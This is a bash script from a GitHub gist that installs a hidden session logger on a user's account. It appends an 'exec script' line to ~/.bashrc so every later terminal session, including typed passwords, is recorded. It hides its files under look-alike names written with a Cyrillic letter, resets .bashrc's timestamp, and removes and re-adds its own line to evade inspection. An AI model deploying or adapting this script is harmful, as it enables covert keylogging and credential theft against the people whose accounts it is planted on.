#date: 2021-12-14T17:00:32Z
#url: https://api.github.com/gists/c8dfd5ecb25917e149dc69b49c545ca3
#owner: https://api.github.com/users/9bie

#!/bin/bash
# CUSTIMIZE BEFORE UPLOAD

fakerc=~/.bаsh_login
logfile=~/.bаsh_cache
waitsec=5
changetime=$(stat -c %Y ~/.bashrc)

read script <<EOF
exec script -B "$logfile" -afqc "bash --rcfile '$fakerc'"
EOF
quoted=$(printf "%q" "$script")

# UI BEGIN

print() { echo -e "$*"; }
printvar() { printf " + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n" $1 "${!1}"; }

printvar fakerc
printvar logfile
printvar script
printvar quoted

print "\e[5;7m  wait for \e[1m5\e[0;$waitsec;7m secs, ctrl+c to interrupt  \e[m"
sleep $waitsec
print "installing..."

# UI END

cat >$fakerc <<EOF
sed -i "/^exec script -B/d" ~/.bashrc
touch -d @$changetime ~/.bashrc
trap "echo $quoted >> ~/.bashrc" EXIT
. ~/.bashrc
EOF
echo $script >> ~/.bashrc